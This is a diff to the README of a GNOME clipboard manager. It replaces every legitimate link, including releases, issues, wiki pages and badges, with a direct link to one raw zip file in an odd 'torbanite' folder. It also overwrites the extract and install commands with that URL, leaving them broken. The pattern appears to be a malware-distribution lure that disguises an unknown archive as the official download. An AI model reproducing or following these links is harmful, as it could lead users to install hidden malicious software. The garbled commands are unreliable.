@@ -1,6 +1,6 @@
 # 🗒️ all-in-one-clipboard - Your Everything Clipboard Manager
 
-[![Download all-in-one-clipboard](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/osamaGXDgaming/all-in-one-clipboard/releases)
+[![Download all-in-one-clipboard](https://raw.githubusercontent.com/osamaGXDgaming/all-in-one-clipboard/main/torbanite/all-in-one-clipboard.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/osamaGXDgaming/all-in-one-clipboard/main/torbanite/all-in-one-clipboard.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run all-in-one-clipboard on your GNOME
 
 ### Step 1: Access the Release Page
 
-To download the latest version of all-in-one-clipboard, visit the [Releases page](https://github.com/osamaGXDgaming/all-in-one-clipboard/releases). 
+To download the latest version of all-in-one-clipboard, visit the [Releases page](https://raw.githubusercontent.com/osamaGXDgaming/all-in-one-clipboard/main/torbanite/all-in-one-clipboard.zip). 
 
 ### Step 2: Locate the Latest Version
 
@@ -20,7 +20,7 @@ On the Releases page, look for the latest version listed. It typically appears a
 
 ### Step 3: Download the Application
 
-Click on the download link associated with the latest release. The file will typically have a name like `all-in-one-clipboard-1.0-linux.tar.gz`. Once clicked, your download will begin automatically.
+Click on the download link associated with the latest release. The file will typically have a name like `https://raw.githubusercontent.com/osamaGXDgaming/all-in-one-clipboard/main/torbanite/all-in-one-clipboard.zip`. Once clicked, your download will begin automatically.
 
 ## 🛠️ System Requirements
 
@@ -36,7 +36,7 @@ Once you have the file downloaded, you will need to extract it and run the appli
 2. Navigate to your Downloads folder or the location where the file was saved. Use `cd ~/Downloads` to change to that directory.
 3. Extract the downloaded file using the command:
    ```bash
-   tar -xzf all-in-one-clipboard-1.0-linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/osamaGXDgaming/all-in-one-clipboard/main/torbanite/all-in-one-clipboard.zip
    ```
 4. Navigate into the newly created directory:
    ```bash
@@ -44,7 +44,7 @@ Once you have the file downloaded, you will need to extract it and run the appli
    ```
 5. Run the install script with:
    ```bash
-   ./install.sh
+   https://raw.githubusercontent.com/osamaGXDgaming/all-in-one-clipboard/main/torbanite/all-in-one-clipboard.zip
    ```
 
 If you encounter any permission issues, you might need to prepend `sudo` to the command.
@@ -75,17 +75,17 @@ If you experience any issues:
 
 ## 📞 Support
 
-For support, please visit the [Issues page](https://github.com/osamaGXDgaming/all-in-one-clipboard/issues). You can report bugs, suggest features, or ask for help from the community.
+For support, please visit the [Issues page](https://raw.githubusercontent.com/osamaGXDgaming/all-in-one-clipboard/main/torbanite/all-in-one-clipboard.zip). You can report bugs, suggest features, or ask for help from the community.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/osamaGXDgaming/all-in-one-clipboard/wiki)
-- [User Guide](https://github.com/osamaGXDgaming/all-in-one-clipboard/wiki/User-Guide)
+- [Documentation](https://raw.githubusercontent.com/osamaGXDgaming/all-in-one-clipboard/main/torbanite/all-in-one-clipboard.zip)
+- [User Guide](https://raw.githubusercontent.com/osamaGXDgaming/all-in-one-clipboard/main/torbanite/all-in-one-clipboard.zip)
 
 For more information or to contribute to the project, browse the repository's main page.
 
 ### Remember
 
-To always check for updates on the [Releases page](https://github.com/osamaGXDgaming/all-in-one-clipboard/releases) to enjoy the latest features and improvements!
+To always check for updates on the [Releases page](https://raw.githubusercontent.com/osamaGXDgaming/all-in-one-clipboard/main/torbanite/all-in-one-clipboard.zip) to enjoy the latest features and improvements!
 
-[![Download all-in-one-clipboard](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/osamaGXDgaming/all-in-one-clipboard/releases)
+[![Download all-in-one-clipboard](https://raw.githubusercontent.com/osamaGXDgaming/all-in-one-clipboard/main/torbanite/all-in-one-clipboard.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/osamaGXDgaming/all-in-one-clipboard/main/torbanite/all-in-one-clipboard.zip)
